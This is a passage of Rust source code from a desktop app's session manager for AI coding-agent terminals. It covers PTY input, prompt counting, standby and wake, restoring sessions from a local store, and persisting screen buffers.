        // decision dialog open (waiting_input) a left mouse click and a
        // single digit (numbered menus / mouse TUIs) count as well.
        // The waiting_input gate keeps random clicks and digits from counting, and
        // dedups itself: the first counted answer resets the status.
        // Auto-approve/auto-respond bypass writeToSession, so here
        // we only capture real input.
        let has_enter = data.contains('\r');
        let is_dialog_answer = !has_enter && was_waiting && is_dialog_answer_input(data);
        let submitted = (has_enter || is_dialog_answer) && count_prompt;
        if submitted {
            Self::increment_prompt_count_locked(&mut guard, session_id, 1);
        }

        // If the user answers while input is awaited (Enter, click or digit),
        // expire the pending ones and reopen the turn.
        if was_waiting && (has_enter || is_dialog_answer) {
            if let Some(session) = guard.sessions.get_mut(session_id) {
                session.pending_interactions.clear();
            }
            // TODO: expire the session's pending interactions here
            // (InteractionManager hook not wired yet).
            Self::update_status_locked(&mut guard, session_id, "in_progress");
        }

        // Inject on the PTY stdin — outside the state lock (see SessionPty).
        let writer = guard
            .sessions
            .get(session_id)
            .and_then(|s| s.pty.as_ref())
            .map(|p| p.writer.clone());
        drop(guard);
        if let Some(writer) = writer {
            writer
                .lock()
                .write_all(data.as_bytes())
                .map_err(|e| e.to_string())?;
        }
        Ok(())
    }

    /// destroySession — PTY kill + cleanup + local store sync (skip_api on quit).
    fn destroy(&self, session_id: &str, skip_api: bool) -> Result<(), String> {
        let (db_id, pending_delta, name) = {
            let mut guard = self.state.lock();
            if !guard.sessions.contains_key(session_id) {
                return Err(format!("Session not found: {session_id}"));
            }
            // PTY kill: explicit ChildKiller + drop of SessionPty
            // (master/writer closed ⇒ SIGHUP to the leader's children too).
            let mut session = guard.sessions.remove(session_id).unwrap();
            session.history.push(SessionEvent {
                timestamp: now_iso(),
                event_type: "destroyed".into(),
                data: None,
            });
            if let Some(pty) = session.pty.take() {
                kill_pty(pty);
            }

            // TODO: clear the session's interactions (InteractionManager).

            // cleanupHookSettings(cwd) if it was the workspace's last session.
            let cwd = session.config.cwd.clone();
            if let Some(cwd) = cwd {
                let workspace_alive = guard
                    .sessions
                    .values()
                    .any(|s| s.config.cwd.as_deref() == Some(cwd.as_str()));
                if !workspace_alive {
                    crate::commands::hook::cleanup_hook_settings(&cwd);
                }
            }

            let name = session.name.clone();
            if let Some(t) = crate::commands::session_tailer::global_tailer() {
                t.stop_tailing(session_id)
            }
            let pending_delta = guard
                .unsynced_prompt_counts
                .get(session_id)
                .copied()
                .unwrap_or(0);
            let db_id = guard.db_ids.get(session_id).cloned();
            guard.unsynced_prompt_counts.remove(session_id);
            (db_id, pending_delta, name)
        };

        // Drain the delta + delete in SEQUENCE on a dedicated thread: the increment
        // PUT must land before the DELETE, and neither of the two
        // calls must block the command (which runs on the main thread).
        let auth = self.snapshot_auth();
        if !skip_api {
            if let Some(db_id) = db_id {
                self.state.lock().db_ids.remove(session_id);
                std::thread::spawn(move || {
                    if pending_delta > 0 {
                        let payload = serde_json::json!({
                            "terminal_prompt_count_increment": pending_delta
                        });
                        let _ = api_update_sync(&auth, &db_id, &payload);
                    }
                    api_destroy_sync(&auth, &db_id);
                });
            } else {
                // No mapped dbId — skip the store delete so as not to delete the
                // wrong session (can happen after an unsynced restart). If its
                // first save is still running, that save deletes what it creates.
                let mut guard = self.state.lock();
                if guard.pending_store_sync.contains_key(session_id) {
                    guard.closed_unsynced.insert(session_id.to_string());
                }
                drop(guard);
                eprintln!(
                    "[SessionManager] No dbId for session \"{name}\" — skipping store delete"
                );
            }
        } else {
            if pending_delta > 0 {
                if let Some(db_id) = &db_id {
                    api_update(
                        &auth,
                        db_id,
                        serde_json::json!({
                            "terminal_prompt_count_increment": pending_delta
                        }),
                    );
                }
            }
            self.state.lock().db_ids.remove(session_id);
        }
        Ok(())
    }

    // ── Helpers on already locked state ────────────────────────────────────

    /// incrementPromptCount — bubble-up to the parent for sub-agents.
    fn increment_prompt_count_locked(state: &mut ManagerState, session_id: &str, amount: u64) {
        if amount == 0 {
            return;
        }
        let target = state
            .sessions
            .get(session_id)
            .and_then(|s| s.parent_session_id.clone())
            .unwrap_or_else(|| session_id.to_string());
        let total = state
            .unsynced_prompt_counts
            .entry(target.clone())
            .or_insert(0);
        *total += amount;
        eprintln!(
            "[PromptCount] +{amount} → {target} (unsynced: {}, dbId: {})",
            *total,
            state
                .db_ids
                .get(&target)
                .map(String::as_str)
                .unwrap_or("NONE")
        );
    }

    /// Public variant of incrementPromptCount for credit points outside
    /// writeToSession (auto-approve tailer, interaction overlay, sub-agent,
    /// worker turn, AI utility features) — every path that writes a prompt into
    /// the session.
    pub fn increment_prompt_count(&self, session_id: &str, amount: u64) {
        let mut guard = self.state.lock();
        Self::increment_prompt_count_locked(&mut guard, session_id, amount);
    }

    /// True if the id is a live session in the pool (main or "[sub]").
    pub fn has_session(&self, session_id: &str) -> bool {
        self.state.lock().sessions.contains_key(session_id)
    }

    /// resolveUtilityPromptTarget — picks the session to credit for an
    /// AI utility prompt (git resolver, commit-msg gen, DB NL query, …).
    /// Preference: explicit sessionId → session with the feature's
    /// cwd/workspace → any top-level session (the ranking is per user).
    /// No session → silent drop.
    pub fn resolve_utility_prompt_target(
        &self,
        session_id: Option<&str>,
        cwd: Option<&str>,
    ) -> Option<String> {
        let guard = self.state.lock();
        if let Some(sid) = session_id {
            if guard.sessions.contains_key(sid) {
                return Some(sid.to_string());
            }
        }
        if let Some(cwd) = cwd {
            for (id, s) in &guard.sessions {
                let cwd_match = s.config.cwd.as_deref() == Some(cwd);
                let ws_match = s.workspace.as_ref().map(|w| w.path.as_str()) == Some(cwd);
                if cwd_match || ws_match {
                    return Some(id.clone());
                }
            }
        }
        guard
            .sessions
            .iter()
            .find(|(_, s)| s.parent_session_id.is_none())
            .map(|(id, _)| id.clone())
    }

    /// persistAllState → sessionManager.saveAll: batch persist of ALL
    /// sessions (live and restored) to the local store. BLOCKING — call only
    /// from the quit flow or from dedicated threads.
    pub fn save_all_to_store(
        &self,
        sub_agents_by_session: &HashMap<String, Vec<JsonValue>>,
    ) -> bool {
        let (auth, payload) = {
            let guard = self.state.lock();
            let sessions: Vec<JsonValue> = guard
                .sessions
                .values()
                .filter(|s| !s.name.starts_with("[sub]"))
                .map(|s| {
                    let config = config_for_store(&s.config);
                    let mut entry = serde_json::json!({
                        "name": s.name,
                        "provider": s.provider,
                        "status": s.status,
                        "config": config,
                        "workspace_path": s.workspace.as_ref().map(|w| w.path.clone()),
                        "workspace_name": s.workspace.as_ref().map(|w| w.name.clone()),
                        "workspace_id": s.workspace_id,
                        "claude_session_id": s.claude_session_id,
                        "view_state": s.view_state,
                    });
                    if let Some(db_id) = guard.db_ids.get(&s.id) {
                        entry["id"] = serde_json::json!(db_id);
                    }
                    // Always present: this is how the store tells this client
                    // (name applied only if renamed here) from older entries.
                    entry["name_authoritative"] =
                        serde_json::json!(guard.renamed_since_persist.contains(&s.id));
                    if let Some(subs) = sub_agents_by_session.get(&s.id) {
                        entry["sub_agents"] = JsonValue::Array(subs.clone());
                    }
                    entry
                })
                .collect();
            let auth = AuthSnapshot {
                device_id: guard.api_device_id.clone(),
                profile_id: guard.active_profile_id.clone(),
            };
            (auth, sessions)
        };
        if payload.is_empty() {
            // Nothing to save: do NOT call /persist — the store would clean up
            // orphans and an empty batch would delete the device's sessions.
            return true;
        }
        let ok = api_persist(&auth, JsonValue::Array(payload));
        if ok {
            self.state.lock().renamed_since_persist.clear();
        }
        ok
    }

    /// Autosave of live sessions' screens (from the scheduler, every tick):
    /// a crash or force-quit skips the save on exit, and after a restart the
    /// session would come back with the screen of its last park. Writes only
    /// the sessions that produced output since the last round; the snapshot
    /// is taken outside the state lock.
    pub fn autosave_live_buffers(&self) {
        static SAVED: std::sync::OnceLock<Mutex<HashMap<String, usize>>> =
            std::sync::OnceLock::new();
        let saved = SAVED.get_or_init(Default::default);
        let live: Vec<(String, Arc<Mutex<OutputBuffer>>)> = {
            let guard = self.state.lock();
            guard
                .sessions
                .iter()
                .filter_map(|(id, s)| {
                    let pty = s.pty.as_ref()?;
                    Some((guard.db_ids.get(id)?.clone(), pty.buffer.clone()))
                })
                .collect()
        };
        for (db_id, buffer) in live {
            let (total, picture) = {
                let mut buf = buffer.lock();
                if buf.total == 0 || saved.lock().get(&db_id) == Some(&buf.total) {
                    continue;
                }
                (buf.total, buf.park_picture())
            };
            if picture.is_empty() {
                continue;
            }
            write_parked_buffer_file(&db_id, &picture);
            saved.lock().insert(db_id, total);
        }
    }

    /// Parked buffers persisted on disk: they survive a restart so restored sessions come back with the
    /// last screen's content instead of a black terminal.
    pub fn persist_live_buffers_to_disk(&self) {
        let snapshots: Vec<(String, String)> = {
            let guard = self.state.lock();
            guard
                .sessions
                .iter()
                .filter_map(|(id, s)| {
                    let db_id = guard.db_ids.get(id)?;
                    let buf = match &s.pty {
                        Some(pty) => pty.buffer.lock().park_picture(),
                        None => s.parked_buffer.clone().unwrap_or_default(),
                    };
                    if buf.is_empty() {
                        return None;
                    }
                    Some((db_id.clone(), buf))
                })
                .collect()
        };
        for (db_id, buf) in snapshots {
            write_parked_buffer_file(&db_id, &buf);
        }
    }

    /// restoreSessionsAndSubAgents (data part): recreates the sessions from the
    /// local store WITHOUT a PTY (lazy boot: the PTY is born on wake/reopen).
    /// Dedup by name against already live sessions. BLOCKING.
    pub fn restore_from_store(&self) -> usize {
        let auth = self.snapshot_auth();
        let rows = api_list(&auth);
        let mut restored = 0usize;
        // Stable sidebar order from one launch to the next. The renderer sorts
        // by createdAt and restored sessions get the restore timestamp: with
        // `now_iso()` per row, consecutive rows land in the same
        // millisecond (sub-ms loop when there is no parked buffer to
        // read) and among ties the HashMap iteration order wins —
        // different in every process → sessions "shuffled" on every restart
        // (seen in the field on Linux). Base + row index in ms: same order
        // in which the store returns them (sort_order, updated_at), i.e. the
        // same one already obtained when timestamps don't collide.
        // Platform gate (user decision: change only Linux, elsewhere
        // the historical per-row timestamp stays).
        let base_ms = epoch_ms();
        let mut guard = self.state.lock();
        for (idx, row) in rows.into_iter().enumerate() {
            let Some(name) = row.get("name").and_then(|v| v.as_str()) else {
                continue;
            };
            // Same comparison as the store and create_session: a live "API"
            // and a stored "api" are the same session, never two.
            let key = crate::local_data::name_key(name);
            if guard
                .sessions
                .values()
                .any(|s| crate::local_data::name_key(&s.name) == key)
            {
                continue;
            }
            // A record already bound to a live session is never bound twice.
            if row
                .get("id")
                .and_then(|v| v.as_str())
                .is_some_and(|db| guard.db_ids.values().any(|d| d == db))
            {
                continue;
            }
            let id = Uuid::new_v4().to_string();
            let now = now_iso();
            // createdAt = created_at of the stored record (immutable): the sidebar
            // sorts by createdAt, so the order stays the creation order on
            // every launch, on all platforms. Fallback (row without a
            // valid created_at): base + row index, never the per-row timestamp.
            let created_at =
                row_created_at_iso(&row).unwrap_or_else(|| iso_from_epoch_ms(base_ms + idx as u64));
            let provider = restored_provider(&row);
            let mut config: SessionConfig = row
                .get("config")
                .cloned()
                .and_then(|c| serde_json::from_value(c).ok())
                .unwrap_or_default();
            if config.token_history_id.is_none() {
                config.token_history_id = Some(
                    row.get("id")
                        .and_then(|v| v.as_str())
                        .unwrap_or(&id)
                        .to_string(),
                );
            }
            let workspace =
                row.get("workspace_path")
                    .and_then(|v| v.as_str())
                    .map(|p| WorkspaceBinding {
                        path: p.to_string(),
                        name: row
                            .get("workspace_name")
                            .and_then(|v| v.as_str())
                            .map(str::to_string)
                            .unwrap_or_else(|| basename(p)),
                    });
            let session = AgentSession {
                id: id.clone(),
                name: name.to_string(),
                provider,
                status: "standby".into(),
                config,
                workspace,
                workspace_id: row
                    .get("workspace_id")
                    .and_then(|v| v.as_str())
                    .map(str::to_string),
                claude_session_id: row
                    .get("claude_session_id")
                    .and_then(|v| v.as_str())
                    .map(str::to_string),
                parent_session_id: None,
                created_at,
                updated_at: now.clone(),
                history: vec![SessionEvent {
                    timestamp: now,
                    event_type: "restored".into(),
                    data: None,
                }],
                pending_interactions: Vec::new(),
                view_state: row
                    .get("view_state")
                    .cloned()
                    .and_then(|v| serde_json::from_value(v).ok()),
                has_terminal: false,
                pty: None,
                standby_at: Some(
                    row.get("standby_at")
                        .and_then(|v| v.as_str())
                        .map(str::to_string)
                        .unwrap_or_else(now_iso),
                ),
                parked_buffer: row
                    .get("id")
                    .and_then(|v| v.as_str())
                    .and_then(read_parked_buffer_file),
            };
            if let Some(db_id) = row.get("id").and_then(|v| v.as_str()) {
                guard.db_ids.insert(id.clone(), db_id.to_string());
            }
            guard.sessions.insert(id, session);
            restored += 1;
        }
        restored
    }

    /// Resolves a session id: the renderer keeps the local id for
    /// live sessions but the stored dbId for DB-only/restored ones — park,
    /// wake and rename must accept both forms.
    pub fn resolve_local_id(&self, id: &str) -> Option<String> {
        let guard = self.state.lock();
        if guard.sessions.contains_key(id) {
            return Some(id.to_string());
        }
        guard
            .db_ids
            .iter()
            .find(|(_, db_id)| db_id.as_str() == id)
            .map(|(local_id, _)| local_id.clone())
    }

    /// Stored dbId of a local session (for the sub-agent stash mirror).
    pub fn db_id_of(&self, session_id: &str) -> Option<String> {
        self.state.lock().db_ids.get(session_id).cloned()
    }

    /// Other main sessions of the same resume family on the same cwd?
    /// Without a captured id, `--continue` would resume the most recent
    /// conversation in the folder: with "neighbors" it is almost certainly another
    /// session's. Narrowed to the resume
    /// family: a codex session does not collide with claude transcripts.
    /// `cwd = None` → the one registered on the session itself is used.
    pub fn cwd_has_resume_siblings(
        &self,
        session_id: &str,
        provider: &str,
        cwd: Option<&str>,
    ) -> bool {
        let guard = self.state.lock();
        let own = guard.sessions.get(session_id).and_then(session_cwd);
        let cwd = cwd.or(own.as_deref());
        has_resume_siblings(
            guard
                .sessions
                .iter()
                .map(|(id, s)| (id.as_str(), s.provider.as_str(), session_cwd(s))),
            session_id,
            provider,
            cwd,
        )
    }

    /// standbySession — PTY kill (buffer preserved) + standby marker.
    /// Idempotent; unknown id = DB-only → stored marker only, None.
    pub fn standby(&self, app: &tauri::AppHandle, session_id: &str) -> Option<SessionSummary> {
        use tauri::Emitter;
        let resolved = self
            .resolve_local_id(session_id)
            .unwrap_or_else(|| session_id.to_string());
        let session_id = resolved.as_str();
        let (summary, standby_at, parked_buf) = match self.park_state(session_id) {
            None => {
                // DB-only session (not live here): only the stored marker.
                let auth = self.snapshot_auth();
                api_update(
                    &auth,
                    session_id,
                    serde_json::json!({ "standby_at": now_iso() }),
                );
                return None;
            }
            Some(ParkState::Already(summary)) => return Some(summary),
            Some(ParkState::Parked {
                summary,
                standby_at,
                parked_buf,
                pty,
            }) => {
                if let Some(pty) = pty {
                    kill_pty(pty); // explicit kill + closing master/writer
                }
                (summary, standby_at, parked_buf)
            }
        };
        let db_id = summary.db_id.clone();
        // Disk mirror: parked_buffer is in-memory and dies with the process —
        // without the file, after a restart the restored session opens on a
        // black terminal until the provider's first paint (perceived lag).
        if let (Some(db), Some(buf)) = (db_id.clone(), parked_buf) {
            std::thread::spawn(move || write_parked_buffer_file(&db, &buf));
        }
        if let Some(tailer) = crate::commands::session_tailer::global_tailer() {
            tailer.stop_tailing(session_id);
        }
        // Standby: freeze the stash
        // mirror with the park roster, THEN kill the sub-agents' PTYs. The
        // standby marker is already set, so the destroy-burst pushes
        // are blocked by the is_standby guard.
        {
            use tauri::Manager;
            let subs = app
                .state::<Arc<crate::commands::subagent::SubAgentManager>>()
                .inner()
                .clone();
            crate::commands::subagent::push_stash_frozen(app, &subs, session_id);
            crate::commands::subagent::destroy_by_parent(app, &subs, session_id, true);
            // Expire the pending interactions: a parked session no longer has
            // a PTY that can answer the pending ones.
            app.state::<Arc<crate::commands::interaction::InteractionManager>>()
                .clear_session(session_id);
        }
        if let Some(db_id) = db_id {
            let auth = self.snapshot_auth();
            api_update(
                &auth,
                &db_id,
                serde_json::json!({ "standby_at": standby_at }),
            );
        }
        let _ = app.emit(
            "session:standby-changed",
            serde_json::json!({ "sessionId": session_id, "standbyAt": standby_at }),
        );
        Some(summary)
    }

    /// Inserts a new session unless `dedup` and a main session with the same
    /// name (compared like the store does: case, accents and trailing spaces
    /// ignored) is already live; then that one's summary comes back and
    /// nothing is inserted. Check and insert happen under one lock.
    fn insert_or_existing(&self, session: AgentSession, dedup: bool) -> Option<SessionSummary> {
        let mut guard = self.state.lock();
        if dedup {
            let key = crate::local_data::name_key(&session.name);
            if let Some(existing) = guard.sessions.values().find(|s| {
                s.parent_session_id.is_none() && crate::local_data::name_key(&s.name) == key
            }) {
                return Some(
                    existing
                        .to_summary()
                        .with_db_id(guard.db_ids.get(&existing.id).cloned()),
                );
            }
        }
        guard.sessions.insert(session.id.clone(), session);
        None
    }

    /// State part of the park: marks the session parked, takes its PTY (the
    /// caller kills it), keeps the screen for the replay and turns the status
    /// to idle. `None` = unknown session; `Already` = already parked
    /// (idempotent: a second park changes nothing).
    fn park_state(&self, session_id: &str) -> Option<ParkState> {
        let mut guard = self.state.lock();
        let session = guard.sessions.get_mut(session_id)?;
        if session.standby_at.is_some() {
            let summary = session.to_summary();
            return Some(ParkState::Already(
                summary.with_db_id(guard.db_ids.get(session_id).cloned()),
            ));
        }
        let standby_at = now_iso();
        session.standby_at = Some(standby_at.clone());
        session.updated_at = standby_at.clone();
        // Buffer snapshot BEFORE the kill, so the replay stays servable.
        let mut parked_buf: Option<String> = None;
        let pty = session.pty.take();
        if let Some(pty) = &pty {
            let buf = pty.buffer.lock().park_picture();
            if !buf.is_empty() {
                parked_buf = Some(buf.clone());
                session.parked_buffer = Some(buf);
            }
        }
        session.has_terminal = false;
        // Nothing runs anymore: the status says so too (the header must not
        // say "running" under the "Session on standby" cover).
        if session.status != "idle" {
            SessionManager::update_status_locked(&mut guard, session_id, "idle");
        }
        let session = guard.sessions.get(session_id)?;
        let summary = session
            .to_summary()
            .with_db_id(guard.db_ids.get(session_id).cloned());
        Some(ParkState::Parked {
            summary,
            standby_at,
            parked_buf,
            pty,
        })
    }

    /// State part of the wake: clears the parked marker and prepares the
    /// resume flags. A second wake arriving while the first is still starting
    /// the PTY finds the session not parked and changes nothing.
    fn begin_wake(&self, session_id: &str, cols: Option<u16>, rows: Option<u16>) -> WakeStart {
        let mut guard = self.state.lock();
        // Read before the session's mutable borrow: needed to mark the resume
        // id as captured ON THIS device.
        let device_id = guard.api_device_id.clone();
        // Account-switch relaunch (session_prepare_account_relaunch): consumed
        // by this wake whatever its outcome.
        let fresh_relaunch = guard.fresh_relaunch.remove(session_id);
        let Some(session) = guard.sessions.get_mut(session_id) else {
            return WakeStart::Unknown;
        };
        let Some(prev) = session.standby_at.clone() else {
            let summary = session.to_summary(); // not parked: no-op
            return WakeStart::NotParked(summary.with_db_id(guard.db_ids.get(session_id).cloned()));
        };
        session.standby_at = None;

        // Current xterm dims (if the renderer passes them): the PTY is reborn
        // at the right grid instead of the 120×30 default — persisted in
        // config so they also apply to future respawns.
        if let Some(c) = cols {
            session.config.cols = Some(c);
        }
        if let Some(r) = rows {
            session.config.rows = Some(r);
        }

        // Provider resume on the next spawn (spawnWithResume): if we have
        // the claudeSessionId we resume THAT conversation, otherwise
        // --continue. Persisted in config so it also applies to future respawns.
        // Applies to ALL providers: each launch builder interprets the flag its
        // own way (codex `resume <sid|--last>`, gemini `--resume latest`,
        // antigravity `--continue`) and providers without resume ignore it.
        if fresh_relaunch {
            // Account switch: new conversation on the active account. The old
            // id is dropped (state + map), the next hook replaces it.
            let provider = session.provider.clone();
            session.claude_session_id = None;
            forget_provider_session_id(&mut session.config, &provider);
            if let Some(obj) = session
                .config
                .provider_options
                .as_mut()
                .and_then(|o| o.as_object_mut())
            {
                obj.insert("resume".into(), serde_json::json!(false));
                obj.remove("claudeSessionId");
            }
        } else {
            let provider = session.provider.clone();
            let sid = resolve_provider_session_id_for_device(
                &provider,
                &session.config,
                &provider,
                session.claude_session_id.as_deref(),
                device_id.as_deref(),
            );
            let opts = session
                .config
                .provider_options
                .get_or_insert_with(|| serde_json::json!({}));
            if let Some(obj) = opts.as_object_mut() {
                obj.insert("resume".into(), serde_json::json!(true));
                if let Some(sid) = &sid {
                    obj.insert("claudeSessionId".into(), serde_json::json!(sid));
                }
            }
        }
        WakeStart::Start {
            provider: session.provider.clone(),
            config: session.config.clone(),
            prev_standby_at: prev,
        }
    }

    /// Attaches a freshly spawned PTY to the session. Refused when the session
    /// was closed, parked again, or already has a PTY while this one was
    /// starting: the new process is killed instead of running unseen next to
    /// (or instead of) what the user expects.
    fn register_pty(&self, session_id: &str, pty: SessionPty) -> Result<(), String> {
        let refused = {
            let mut guard = self.state.lock();
            match guard.sessions.get_mut(session_id) {
                Some(s) if s.standby_at.is_none() && s.pty.is_none() => {
                    s.pty = Some(pty);
                    None
                }
                Some(s) if s.standby_at.is_some() => Some((pty, "parked")),
                Some(_) => Some((pty, "already running")),
                None => Some((pty, "closed")),
            }
        };
        match refused {
            None => Ok(()),
            Some((pty, why)) => {
                kill_pty(pty);
                Err(format!(
                    "The session was {why} while its terminal was starting; the new terminal was stopped."
                ))
            }
        }
    }

    /// A spawned PTY is live on the session: terminal on, status idle. False
    /// (and nothing changed) when the session was parked or closed between
    /// the registration and this call: the park already took the PTY and
    /// told the UI, so the caller must not report the session awake.
    fn mark_pty_live(&self, session_id: &str) -> bool {
        let mut guard = self.state.lock();
        let Some(session) = guard.sessions.get_mut(session_id) else {
            return false;
        };
        if session.pty.is_none() || session.standby_at.is_some() {
            return false;
        }
        session.has_terminal = true;
        session.updated_at = now_iso();
        SessionManager::update_status_locked(&mut guard, session_id, "idle");
        true
    }

    /// A PTY reader reached EOF: records the exit and says whether the
    /// session must converge into standby (main sessions only). Only the
    /// session's own terminal speaks for it: a terminal refused at
    /// registration ("already running") ends right away, and treating its
    /// EOF as the session's exit parked the session and killed the terminal
    /// that was actually running. Decision under one lock; the caller parks
    /// outside it (standby() takes the lock again).
    fn note_pty_exit(
        &self,
        session_id: &str,
        own_buffer: &Arc<Mutex<OutputBuffer>>,
        data: Option<JsonValue>,
    ) -> bool {
        let mut guard = self.state.lock();
        let Some(s) = guard.sessions.get_mut(session_id) else {
            return false; // destroy/teardown in progress: nothing to do
        };
        if s.standby_at.is_some() {
            return false; // voluntary park: standby() already did everything
        }
        if s.pty
            .as_ref()
            .is_some_and(|p| !Arc::ptr_eq(&p.buffer, own_buffer))
        {
            return false; // another terminal owns the session
        }
        s.history.push(SessionEvent {
            timestamp: now_iso(),
            event_type: "exited".into(),
            data,
        });
        // Only MAIN sessions converge into parked (same convention as the
        // auto-standby scheduler): sub-agents stay "exited".
        let is_main = s.parent_session_id.is_none() && !s.name.starts_with("[sub]");
        SessionManager::update_status_locked(&mut guard, session_id, "exited");
        is_main
    }

    /// getActiveSessionProfileId.
    pub fn get_active_profile_id(&self) -> Option<String> {
        self.state.lock().active_profile_id.clone()
    }

    /// setActiveSessionProfileId — profile passed to the local store.
    pub fn set_active_profile_id(&self, profile_id: Option<String>) {
        self.state.lock().active_profile_id = profile_id;
    }

    /// destroyAll(skipApi) — local teardown of ALL sessions (drop of the
    /// PTYs) WITHOUT deleting the stored records (just persisted by the caller).
    pub fn destroy_all_local(&self) {
        let mut guard = self.state.lock();
        for session in guard.sessions.values_mut() {
            if let Some(pty) = session.pty.take() {
                kill_pty(pty);
            }
        }
        guard.sessions.clear();
        guard.db_ids.clear();
        guard.unsynced_prompt_counts.clear();
        guard.pending_store_sync.clear();
    }

    /// applyProviderAccountToWorkspace — pins (or unpins) a
    /// provider account on all sessions of a workspace+provider.
    /// `account = None` = inherit (follow the global one); `Some(None)` = explicit
    /// opt-out; `Some(Some(id))` = specific account. Returns the touched ids.
    pub fn apply_provider_account_to_workspace(
        &self,
        workspace_id: Option<&str>,
        provider: &str,
        account: Option<Option<String>>,
    ) -> Vec<String> {
        let mut guard = self.state.lock();
        let mut updated = Vec::new();
        for session in guard.sessions.values_mut() {
            if session.provider != provider {
                continue;
            }
            if session.workspace_id.as_deref() != workspace_id {
                continue;
            }
            session.config.provider_account_id = account.clone();
            session.updated_at = now_iso();
            updated.push(session.id.clone());
        }
        updated
    }

    /// True if the session is parked (for the remote access data plane).
    /// Agents — closes ONLY the session PTY (the "lead"): sub-agents
    /// stay alive, the session stays active (no standby_at), the stored record
    /// is not touched. Wake does not respawn it as long as
    /// `agents::is_lead_closed` (flag written by the caller BEFORE the kill).
    pub fn close_own_pty(
        &self,
        app: &tauri::AppHandle,
        session_id: &str,
    ) -> Option<SessionSummary> {
        use tauri::Emitter;
        let resolved = self
            .resolve_local_id(session_id)
            .unwrap_or_else(|| session_id.to_string());
        let session_id = resolved.as_str();
        let (summary, db_id, parked_buf, pty) = self.close_lead_state(session_id)?;
        if let Some(pty) = pty {
            kill_pty(pty);
        }
        if let (Some(db), Some(buf)) = (db_id.clone(), parked_buf) {
            std::thread::spawn(move || write_parked_buffer_file(&db, &buf));
        }
        if let Some(tailer) = crate::commands::session_tailer::global_tailer() {
            tailer.stop_tailing(session_id);
        }
        let _ = app.emit(
            "session:lead-closed",
            serde_json::json!({ "sessionId": session_id }),
        );
        Some(summary.with_db_id(db_id))
    }

    /// State part of closing the lead: the session PTY is taken (the caller
    /// kills it), the screen kept for the replay, status idle. The session
    /// stays active (no standby marker) and its sub-agents are not touched.
    #[allow(clippy::type_complexity)]
    fn close_lead_state(
        &self,
        session_id: &str,
    ) -> Option<(
        SessionSummary,
        Option<String>,
        Option<String>,
        Option<SessionPty>,
    )> {
        let mut guard = self.state.lock();
        let session = guard.sessions.get_mut(session_id)?;
        // Buffer snapshot BEFORE the kill: the replay stays servable
        // on reopen (same as standby).
        let mut parked_buf: Option<String> = None;
        let pty = session.pty.take();
        if let Some(pty) = &pty {
            let buf = pty.buffer.lock().park_picture();
            if !buf.is_empty() {
                parked_buf = Some(buf.clone());
                session.parked_buffer = Some(buf);
            }
        }
        session.has_terminal = false;
        SessionManager::update_status_locked(&mut guard, session_id, "idle");
        let session = guard.sessions.get(session_id)?;
        Some((
            session.to_summary(),
            guard.db_ids.get(session_id).cloned(),
            parked_buf,
            pty,
        ))
    }

    /// Wake of a session whose lead the user closed: only the parked marker
    /// goes, no PTY is spawned (the caller restores the sub-agents).
    fn wake_closed_lead_state(&self, session_id: &str) -> Option<(SessionSummary, Option<String>)> {
        let mut guard = self.state.lock();
        let session = guard.sessions.get_mut(session_id)?;
        session.standby_at = None;
        session.updated_at = now_iso();
        let summary = session.to_summary();
        Some((summary, guard.db_ids.get(session_id).cloned()))
    }

    /// Agents — prepares the respawn of the session PTY via wake: a closed
    /// lead is not on standby (pty None, standby_at None), so standby_at is
    /// set so that `wake_session_impl` takes the normal branch (provider
    /// resume included). No-op if the session already has a PTY or is parked.
    pub fn mark_for_respawn(&self, session_id: &str) {
        let resolved = self
            .resolve_local_id(session_id)
            .unwrap_or_else(|| session_id.to_string());
        let mut guard = self.state.lock();
        if let Some(session) = guard.sessions.get_mut(&resolved) {
            if session.pty.is_none() && session.standby_at.is_none() {
                session.standby_at = Some(now_iso());
            }
        }
    }

    pub fn is_standby(&self, session_id: &str) -> bool {
        self.state
            .lock()
            .sessions
            .get(session_id)
            .map(|s| s.standby_at.is_some())
            .unwrap_or(false)
    }

    /// Provider of a session (for the hook server's metrics wiring).
    pub fn provider_of(&self, session_id: &str) -> Option<String> {
        self.state
            .lock()
            .sessions
            .get(session_id)
            .map(|s| s.provider.clone())
    }

    /// Human-readable session name (the hook server's `ResolveNameFn`).
    pub fn display_name(&self, session_id: &str) -> Option<String> {
        self.state
            .lock()
            .sessions
            .get(session_id)
            .map(|s| s.name.clone())
    }

    /// updateStatus exposed to the hook server (`UpdateStatusFn`).
    pub fn set_status(&self, session_id: &str, status: &str) {
        let mut state = self.state.lock();
        Self::update_status_locked(&mut state, session_id, status);
    }

    /// setClaudeSessionId — captures the provider's conversation id (hook
    /// SessionStart) on the main session, so wake/respawn use
    /// `--resume <sid>` instead of the `--continue` fallback, which in a shared
    /// cwd resumes anyone's most recent conversation.
    /// Best-effort immediate sync to the local store: waiting for the quit persist
    /// would lose the just-captured id if the app crashes first.
    pub fn set_claude_session_id(&self, session_id: &str, claude_session_id: &str) {
        if !is_safe_session_id(claude_session_id) {
            return;
        }
        crate::commands::session_model::forget(session_id);
        let (db_id, config_patch) = {
            let mut state = self.state.lock();
            let Some(session) = state.sessions.get_mut(session_id) else {
                return;
            };
            // Even with an unchanged id the map may be missing (session created by a
            // build that did not write it), so we reconcile anyway — but
            // if NOTHING changes we exit without a PATCH: the SessionStart hook repeats
            // this call on every resume/compact and the traffic must be avoided.
            let same_id = session.claude_session_id.as_deref() == Some(claude_session_id);
            session.claude_session_id = Some(claude_session_id.to_string());
            let provider = session.provider.clone();
            let device_id = state.api_device_id.clone();
            let Some(session) = state.sessions.get_mut(session_id) else {
                return;
            };
            let changed = record_provider_session_id(
                &mut session.config,
                &provider,
                claude_session_id,
                device_id.as_deref(),
            );
            if same_id && changed.is_none() {
                return;
            }
            let config_patch = changed.map(|_| session.config.clone());
            (state.db_ids.get(session_id).cloned(), config_patch)
        };
        let Some(db_id) = db_id else { return };
        let auth = self.snapshot_auth();
        // The column stays the source old builds read; the map in
        // config is the one that survives a provider switch.
        let mut payload = serde_json::json!({ "claude_session_id": claude_session_id });
        if let Some(config) = config_patch {
            // Same filter as all other sends: no env, extensions or prompts.
            if let Some(obj) = payload.as_object_mut() {
                obj.insert("config".into(), config_for_store(&config));
            }
        }
        api_update(&auth, &db_id, payload);
    }

    /// refresh_resume_ids_from_store — realigns resume ids with the
    /// stored record before a spawn. Needed when the stored record is newer
    /// than memory (for example written by the web UI), while this app still
    /// has in RAM the id from its last turn (or none).
    ///
    /// The merge is additive by construction — unknown stored keys get in,
    /// local ones are never deleted by a partial response — so
    /// a failed read or an older record cannot make the local state
    /// worse. Best-effort: any error leaves everything as is.
